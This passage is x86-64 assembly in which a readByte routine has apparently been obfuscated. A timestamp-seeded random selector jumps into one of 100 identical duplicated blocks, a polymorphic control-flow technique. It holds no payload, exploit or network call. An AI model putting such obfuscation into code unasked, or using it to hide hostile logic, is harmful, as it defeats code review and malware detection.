	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 54
.LreadByte_win2_var54:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 55
.LreadByte_win2_var55:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 56
.LreadByte_win2_var56:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 57
.LreadByte_win2_var57:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 58
.LreadByte_win2_var58:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 59
.LreadByte_win2_var59:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 60
.LreadByte_win2_var60:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 61
.LreadByte_win2_var61:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 62
.LreadByte_win2_var62:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 63
.LreadByte_win2_var63:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 64
.LreadByte_win2_var64:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 65
.LreadByte_win2_var65:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 66
.LreadByte_win2_var66:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 67
.LreadByte_win2_var67:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 68
.LreadByte_win2_var68:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 69
.LreadByte_win2_var69:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 70
.LreadByte_win2_var70:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 71
.LreadByte_win2_var71:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 72
.LreadByte_win2_var72:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 73
.LreadByte_win2_var73:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 74
.LreadByte_win2_var74:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 75
.LreadByte_win2_var75:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 76
.LreadByte_win2_var76:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 77
.LreadByte_win2_var77:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 78
.LreadByte_win2_var78:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 79
.LreadByte_win2_var79:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 80
.LreadByte_win2_var80:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 81
.LreadByte_win2_var81:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 82
.LreadByte_win2_var82:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 83
.LreadByte_win2_var83:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 84
.LreadByte_win2_var84:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 85
.LreadByte_win2_var85:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 86
.LreadByte_win2_var86:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 87
.LreadByte_win2_var87:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 88
.LreadByte_win2_var88:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 89
.LreadByte_win2_var89:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 90
.LreadByte_win2_var90:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 91
.LreadByte_win2_var91:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 92
.LreadByte_win2_var92:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 93
.LreadByte_win2_var93:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 94
.LreadByte_win2_var94:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 95
.LreadByte_win2_var95:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 96
.LreadByte_win2_var96:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 97
.LreadByte_win2_var97:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 98
.LreadByte_win2_var98:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 99
.LreadByte_win2_var99:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
.LreadByte_win2_continue:
	jl	LBB3_24
## %bb.23:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1076(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_25
LBB3_24:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1076(%rbp), %eax
	movl	%eax, -1080(%rbp)
	movl	-1072(%rbp), %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_29
LBB3_25:                                ##   in Loop: Header=BB3_21 Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win1_var0
	cmpl	$1, %eax
	je	.LreadByte_win1_var1
	cmpl	$2, %eax
	je	.LreadByte_win1_var2
	cmpl	$3, %eax
	je	.LreadByte_win1_var3
	cmpl	$4, %eax
	je	.LreadByte_win1_var4
	cmpl	$5, %eax
	je	.LreadByte_win1_var5
	cmpl	$6, %eax
	je	.LreadByte_win1_var6
	cmpl	$7, %eax
	je	.LreadByte_win1_var7
	cmpl	$8, %eax
	je	.LreadByte_win1_var8
	cmpl	$9, %eax
	je	.LreadByte_win1_var9
	cmpl	$10, %eax
	je	.LreadByte_win1_var10
	cmpl	$11, %eax
	je	.LreadByte_win1_var11
	cmpl	$12, %eax
	je	.LreadByte_win1_var12
	cmpl	$13, %eax
	je	.LreadByte_win1_var13
	cmpl	$14, %eax
	je	.LreadByte_win1_var14
	cmpl	$15, %eax
	je	.LreadByte_win1_var15
	cmpl	$16, %eax
	je	.LreadByte_win1_var16
	cmpl	$17, %eax
	je	.LreadByte_win1_var17
	cmpl	$18, %eax
	je	.LreadByte_win1_var18
	cmpl	$19, %eax
	je	.LreadByte_win1_var19
	cmpl	$20, %eax
	je	.LreadByte_win1_var20
	cmpl	$21, %eax
	je	.LreadByte_win1_var21
	cmpl	$22, %eax
	je	.LreadByte_win1_var22
	cmpl	$23, %eax
	je	.LreadByte_win1_var23
	cmpl	$24, %eax
	je	.LreadByte_win1_var24
	cmpl	$25, %eax
	je	.LreadByte_win1_var25
	cmpl	$26, %eax
	je	.LreadByte_win1_var26
	cmpl	$27, %eax
	je	.LreadByte_win1_var27
	cmpl	$28, %eax
	je	.LreadByte_win1_var28
	cmpl	$29, %eax
	je	.LreadByte_win1_var29
	cmpl	$30, %eax
	je	.LreadByte_win1_var30
	cmpl	$31, %eax
	je	.LreadByte_win1_var31
	cmpl	$32, %eax
	je	.LreadByte_win1_var32
	cmpl	$33, %eax
	je	.LreadByte_win1_var33
	cmpl	$34, %eax
	je	.LreadByte_win1_var34
	cmpl	$35, %eax
	je	.LreadByte_win1_var35
	cmpl	$36, %eax
	je	.LreadByte_win1_var36
	cmpl	$37, %eax
	je	.LreadByte_win1_var37
	cmpl	$38, %eax
	je	.LreadByte_win1_var38
	cmpl	$39, %eax
	je	.LreadByte_win1_var39
	cmpl	$40, %eax
	je	.LreadByte_win1_var40
	cmpl	$41, %eax
	je	.LreadByte_win1_var41
	cmpl	$42, %eax
	je	.LreadByte_win1_var42
	cmpl	$43, %eax
	je	.LreadByte_win1_var43
	cmpl	$44, %eax
	je	.LreadByte_win1_var44
	cmpl	$45, %eax
	je	.LreadByte_win1_var45
	cmpl	$46, %eax
	je	.LreadByte_win1_var46
	cmpl	$47, %eax
	je	.LreadByte_win1_var47
	cmpl	$48, %eax
	je	.LreadByte_win1_var48
	cmpl	$49, %eax
	je	.LreadByte_win1_var49
	cmpl	$50, %eax
	je	.LreadByte_win1_var50
	cmpl	$51, %eax
	je	.LreadByte_win1_var51
	cmpl	$52, %eax
	je	.LreadByte_win1_var52
	cmpl	$53, %eax
	je	.LreadByte_win1_var53
	cmpl	$54, %eax
	je	.LreadByte_win1_var54
	cmpl	$55, %eax
	je	.LreadByte_win1_var55
	cmpl	$56, %eax
	je	.LreadByte_win1_var56
	cmpl	$57, %eax
	je	.LreadByte_win1_var57
	cmpl	$58, %eax
	je	.LreadByte_win1_var58
	cmpl	$59, %eax
	je	.LreadByte_win1_var59
	cmpl	$60, %eax
	je	.LreadByte_win1_var60
	cmpl	$61, %eax
	je	.LreadByte_win1_var61
	cmpl	$62, %eax
	je	.LreadByte_win1_var62
	cmpl	$63, %eax
	je	.LreadByte_win1_var63
	cmpl	$64, %eax
	je	.LreadByte_win1_var64
	cmpl	$65, %eax
	je	.LreadByte_win1_var65
	cmpl	$66, %eax
	je	.LreadByte_win1_var66
	cmpl	$67, %eax
	je	.LreadByte_win1_var67
	cmpl	$68, %eax
	je	.LreadByte_win1_var68
	cmpl	$69, %eax
	je	.LreadByte_win1_var69
	cmpl	$70, %eax
	je	.LreadByte_win1_var70
	cmpl	$71, %eax
	je	.LreadByte_win1_var71
	cmpl	$72, %eax
	je	.LreadByte_win1_var72
	cmpl	$73, %eax
	je	.LreadByte_win1_var73
	cmpl	$74, %eax
	je	.LreadByte_win1_var74
	cmpl	$75, %eax
	je	.LreadByte_win1_var75
	cmpl	$76, %eax
	je	.LreadByte_win1_var76
	cmpl	$77, %eax
	je	.LreadByte_win1_var77
	cmpl	$78, %eax
	je	.LreadByte_win1_var78
	cmpl	$79, %eax
	je	.LreadByte_win1_var79
	cmpl	$80, %eax
	je	.LreadByte_win1_var80
	cmpl	$81, %eax
	je	.LreadByte_win1_var81
	cmpl	$82, %eax
	je	.LreadByte_win1_var82
	cmpl	$83, %eax
	je	.LreadByte_win1_var83
	cmpl	$84, %eax
	je	.LreadByte_win1_var84
	cmpl	$85, %eax
	je	.LreadByte_win1_var85
	cmpl	$86, %eax
	je	.LreadByte_win1_var86
	cmpl	$87, %eax
	je	.LreadByte_win1_var87
	cmpl	$88, %eax
	je	.LreadByte_win1_var88
	cmpl	$89, %eax
	je	.LreadByte_win1_var89
	cmpl	$90, %eax
	je	.LreadByte_win1_var90
	cmpl	$91, %eax
	je	.LreadByte_win1_var91
	cmpl	$92, %eax
	je	.LreadByte_win1_var92
	cmpl	$93, %eax
	je	.LreadByte_win1_var93
	cmpl	$94, %eax
	je	.LreadByte_win1_var94
	cmpl	$95, %eax
	je	.LreadByte_win1_var95
	cmpl	$96, %eax
	je	.LreadByte_win1_var96
	cmpl	$97, %eax
	je	.LreadByte_win1_var97
	cmpl	$98, %eax
	je	.LreadByte_win1_var98
	cmpl	$99, %eax
	je	.LreadByte_win1_var99
	jmp	.LreadByte_win1_var0
## Variant 0
.LreadByte_win1_var0:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 1
.LreadByte_win1_var1:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 2
.LreadByte_win1_var2:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 3
.LreadByte_win1_var3:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 4
.LreadByte_win1_var4:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 5
.LreadByte_win1_var5:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 6
.LreadByte_win1_var6:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 7
.LreadByte_win1_var7:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 8
.LreadByte_win1_var8:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 9
.LreadByte_win1_var9:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 10
.LreadByte_win1_var10:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 11
.LreadByte_win1_var11:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 12
.LreadByte_win1_var12:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 13
.LreadByte_win1_var13:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 14
.LreadByte_win1_var14:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 15
.LreadByte_win1_var15:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 16
.LreadByte_win1_var16:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 17
.LreadByte_win1_var17:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 18
.LreadByte_win1_var18:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 19
.LreadByte_win1_var19:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 20
.LreadByte_win1_var20:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 21
.LreadByte_win1_var21:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 22
.LreadByte_win1_var22:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 23
.LreadByte_win1_var23:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 24
.LreadByte_win1_var24:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 25
.LreadByte_win1_var25:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 26
.LreadByte_win1_var26:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 27
.LreadByte_win1_var27:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 28
.LreadByte_win1_var28:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 29
.LreadByte_win1_var29:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 30
.LreadByte_win1_var30:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 31
.LreadByte_win1_var31:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 32
.LreadByte_win1_var32:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 33
.LreadByte_win1_var33:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 34
.LreadByte_win1_var34:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
